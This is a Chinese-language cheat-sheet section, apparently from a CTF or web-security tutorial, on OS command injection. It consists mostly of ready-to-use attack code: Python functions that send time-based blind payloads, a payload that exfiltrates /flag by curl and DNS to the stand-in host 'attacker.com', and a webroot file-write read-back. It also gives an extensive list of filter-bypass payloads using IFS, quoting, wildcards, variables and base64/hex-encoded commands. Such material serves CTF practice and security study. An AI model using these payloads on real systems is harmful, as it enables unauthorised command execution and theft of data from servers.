# 命令注入

### 7.1 无回显注入

```python
import requests
import time

# 当命令执行结果不返回页面时
# 方法1：时间盲注
def time_based_cmd_injection(url, param):
    """时间盲注确认命令注入"""
    payload = "; sleep 5; #"
    
    start = time.time()
    r = requests.get(url, params={param: payload})
    elapsed = time.time() - start
    
    if elapsed > 4:
        print("[+] 存在命令注入")
        return True
    return False

# 方法2：DNS外带数据
def oob_cmd_injection(url, param):
    """通过DNS外带数据"""
    domain = "attacker.com"
    payload = f"; curl http://$(cat /flag | base64).{domain}; #"
    requests.get(url, params={param: payload})
    # 在DNS服务器上查看查询记录

# 方法3：写文件后读取
def file_write_cmd_injection(url, param, web_root):
    """将命令结果写入文件后读取"""
    payload = f"; cat /flag > {web_root}/output.txt; #"
    requests.get(url, params={param: payload})
    
    # 读取输出文件
    r = requests.get(f"http://example.com/output.txt")
    return r.text
```

### 7.2 绕过过滤

```python
# 命令注入过滤绕过
cmd_injection_bypass = {
    # 空格绕过
    "space": [
        "${IFS}",      # 内部字段分隔符
        "$IFS",        # 同上
        "{cat,/flag}", # 大括号展开
        "<",           # 重定向
        "%09",         # Tab字符
        "%20",         # URL编码空格
    ],
    
    # 关键字绕过
    "keyword": [
        "cat → ca''t, ca\\t, ca${x}t, /bin/cat",
        "flag → fla''g, fla\\g, f??g, fl*g",
        "ls → l''s, l\\s",
        "sh → /bin/sh, /bin/bash",
    ],
    
    # 通配符绕过
    "wildcard": [
        "/bin/cat /fla* → /???/??t /???g",
        "ls /flag → /bin/l? /fla?",
    ],
    
    # 变量绕过
    "variable": [
        "a=ca;b=t;$a$b /flag",
        "a=fl;b=ag;cat /$a$b",
    ],
    
    # 反引号/命令替换
    "backtick": [
        "`cat /flag`",
        "$(cat /flag)",
    ],
    
    # 编码绕过
    "encoding": [
        # Base64
        "$(echo Y2F0IC9mbGFn | base64 -d)",
        # Hex
        "$(echo 636174202f666c6167 | xxd -r -p)",
        # Oct
        "$(printf '\\x63\\x61\\x74')",
    ],
}

# 命令分隔符
separators = [";", "&&", "||", "|", "&",  "%0a", "%0d"]
```

### 7.3 Linux特殊字符

```bash
# 常用命令注入分隔符
;     # 顺序执行多条命令
|     # 管道，前一条命令的输出作为后一条的输入
||    # 前一条失败才执行后一条
&&    # 前一条成功才执行后一条
&     # 后台执行
%0a   # 换行符
%0d   # 回车符
$()   # 命令替换
``    # 命令替换（反引号）
```
